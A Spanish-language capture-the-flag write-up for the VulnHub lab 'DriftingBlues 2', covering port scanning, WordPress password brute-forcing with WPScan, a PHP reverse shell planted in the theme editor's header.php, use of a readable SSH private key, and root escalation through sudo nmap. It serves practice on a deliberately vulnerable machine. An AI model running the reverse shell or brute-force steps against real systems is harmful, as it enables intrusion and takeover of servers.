---
title: Driffting Blues 2
date: 2024-08-10
categories: [WRITEUPS, VulnHub]
tags: []  # TAG names should always be lowercase
image: /assets/images/vulnhub/logo.png
---

Buenas, en esta máquina explotaremos un **Wordpress** con **WPScan**, para encontrar credenciales y poder obtener acceso a la máquina mediante el panel de administración de **Wordpress**, para escalar privilegios nos aprovecharemos de una mala administración de permisos para la **clave privada** de **SSH**.

---

En este ***Writeup*** se engloban las siguientes fases:
- **[Reconocimiento](#reconocimiento)**
- **[Explotación](#explotación)**
- **[Escalada de privilegios](#escalada-de-privilegios)**

---

## **Reconocimiento**

Lo primero que realizaremos una vez conozcamos la dirección *IP*, será realizar un escaneo con **NMAP**, para comprobar los puertos que tiene abiertos.

```bash
nmap -p- --open -T5 192.168.1.145 -n -Pn -v
```

![picture](/assets/images/vulnhub/db2-1.png){: w="600" h="300" }

Una vez comprobado, se lanzarán los scripts predeterminados de NMAP, para ver si encuentra algo significativo en los puertos que se han encontrado abiertos.

```bash
nmap -p21,22,80 -sC -sV 192.168.1.145 -v
```

![picture](/assets/images/vulnhub/db2-2.png){: w="600" h="300" }

Se encuentra que el usuario **Anonymous** del servicio **FTP** está activo, y en su directorio podemos encontrar una imagen llamada "*secret.jpg*".

![picture](/assets/images/vulnhub/db2-3.png){: w="600" h="300" }
![picture](/assets/images/vulnhub/db2-4.png){: w="600" h="300" }

A continuación, iremos a la página web para ver su contenido.

![picture](/assets/images/vulnhub/db2-5.png){: w="600" h="300" }

No se aprecia nada, así que se realizará **Fuzzing**, para intentar encontrar alguna entrada que no se pueda ver.

```bash
gobuster dir -u http://192.168.1.145/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .txt,.php,.html,.sh,.png,.jpg,.jpeg -b 404,403 
```

![picture](/assets/images/vulnhub/db2-6.png)

Gobuster encuentra "**/blog/**", pero no se ven los estilos de la página.

![picture](/assets/images/vulnhub/db2-7.png)

Viendo el código fuente de la página, se puede comprobar que el servidor asociado a la **IP** tiene un nombre de **dominio**, el cual lo habrá que añadirlo al archivo "**/etc/hosts**".

![picture](/assets/images/vulnhub/db2-8.png)
![picture](/assets/images/vulnhub/db2-9.png)

Con esto ya se puede ver la página web tal como es, esto ocurre porque los servidores web a menudo utilizan nombres de dominio para decidir qué contenido mostrar, especialmente cuando se manejan múltiples sitios en la misma dirección IP. Usar un nombre de dominio en lugar de una IP permite que el servidor web sirva el contenido adecuado según la configuración de "virtual hosts". Cuando configuras el nombre de dominio en /etc/hosts, le estás diciendo a tu máquina que use ese nombre de dominio para la IP dada, lo que permite al servidor web responder correctamente basándose en esa información.

![picture](/assets/images/vulnhub/db2-10.png)

Con **Wappalyzer**, que es una extensión del navegador gratuita, se puede ver qué está corriendo por detrás de la página web, el gestor de contenidos es *Wordpress*, usa *php*, *mysql*, etc.

![picture](/assets/images/vulnhub/db2-12.png){: w="300" h="200" }

A continuación realizaré **Fuzzing** sobre "*http://driftingblues.box/blog/*" para ver si hubiera más entradas dentro de "**/blog/**".

![picture](/assets/images/vulnhub/db2-13.png)

---

## **Explotación**

Al ver que está corriendo un **Wordpress**, con **WPSCAN**, se podrá hacer un escaneo del gestor, (*es recomendable crearse una cuenta en WPSCAN para poder obtener la API-token, que sirve para acceder a ciertos servicios y características avanzadas proporcionados por WPScan*).

Ésta herramienta puede buscar *usuarios*, *vulnerabilidades*, *plugins*, *temas*... En este caso se buscarán usuarios.

```bash
wpscan --url http://driftingblues.box/blog -e u --api-token="API"
```

![picture](/assets/images/vulnhub/db2-14.png){: w="600" h="300" }

Y **WPSCAN** nos encuentra un usuario.

![picture](/assets/images/vulnhub/db2-15.png){: w="600" h="300" }

A continuación, se realizará un** ataque de diccionario** con la misma herramienta para encontrar la contraseña (*-U usuario*) (*-P ruta del diccionario*).

```bash
wpscan --url http://driftingblues.box/blog -U "usuario" -P /usr/share/wordlists/rockyou.txt --api-token="API"
```

![picture](/assets/images/vulnhub/db2-16.png)

Y encuentra la contraseña, así que lo siguiente será probar a entrar en el panel de autenticación **wp-admin** que había reportado antes **Gobuster** mediante el **Fuzzing** realizado en "*http://driftingblues.box/blog/*".

![picture](/assets/images/vulnhub/db2-17.png)

Y obtenemos acceso al panel del administrador.

![picture](/assets/images/vulnhub/db2-19.png)

A continuación, lo siguiente será obtener una **Shell interactiva** en nuestra máquina local, podremos escribir código **PHP** que se ejecutará dentro de "*Theme File Editor*", en el archivo "*header.php*".

```php
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/'Nuestra IP'/4444 0>&1'");
?>
```

![picture](/assets/images/vulnhub/db2-20.png)

Y una vez guardado el archivo, se creará un **Listener** en la máquina local con **ncat** por el puerto indicado en la **Reverse Shell**.

- *Listener*

    ```bash
    nc -nlvp 4444
    ```

En el navegador, para poder ejecutar la **Reverse shell**, se introducirá la ruta del archivo "*header.php*". 

![picture](/assets/images/vulnhub/db2-21.png)

Y automáticamente, nos mandará una** Shell interactiva**, con lo cual, ya estaremos dentro del servidor.

![picture](/assets/images/vulnhub/db2-22.png){: w="600" h="300" }

---

## **Escalada de privilegios**

Se realiza un tratamiento de la **TTY** para poder movernos mejor por la máquina.

Dentro de la máquina, el la ruta "**/home/**" se encuentra un usuario llamado **freddie**, no tenemos acceso a su directorio personal, lo siguiente será intentar migrar de usuario a **freddie**.

![picture](/assets/images/vulnhub/db2-23.png)

Viendo los permisos que tenemos dentro del directorio personal de **freddie**, se comprueba que el usuario **www-data** tiene permisos de lectura en el directorio "**.ssh**", que es el cual almacena las claves de conexión de ssh, y dentro del directorio indicado, también tiene permisos de lectura en la clave privada "**id_rsa**".

![picture](/assets/images/vulnhub/db2-24.png){: w="600" h="300" }

Mediante **SSH** se intentará entrar en el servidor como el usurio **freddie**, para ello, habrá que copiar la clave privada para crear un archivo con la clave en nuestra máquina local, la llamaremos igual (la clave privada tiene que tener permisos 600).

![picture](/assets/images/vulnhub/db2-25.png){: w="600" h="300" }

Se prueba a entrar, y se obtiene acceso al servidor como el usuario **freddie**.

![picture](/assets/images/vulnhub/db2-26.png){: w="600" h="300" }

Dentro del directorio personal de freddie, se encuentra la primera **flag**.

![picture](/assets/images/vulnhub/db2-27.png){: w="600" h="300" }

Comprobando los permisos de **SUDO** que tiene el usuario **freddie**, se comprueba que tiene los permisos en el binario "**/usr/bin/nmap**".

La web de **GTFObins** es una base de datos y un recurso para encontrar y documentar binarios de sistemas Unix/Linux, que pueden ser utilizados para obtener escalada de privilegios o ejecutar comandos en un entorno comprometido.

Dentro de la [**WEB**](https://gtfobins.github.io/gtfobins/nmap/) nos indica como escalar privilegios.

Lo ejecutamos, y obtenemos la shell de **root**, en su directorio personal encontramos la segunda **flag**.

![picture](/assets/images/vulnhub/db2-28.png){: w="600" h="300" }











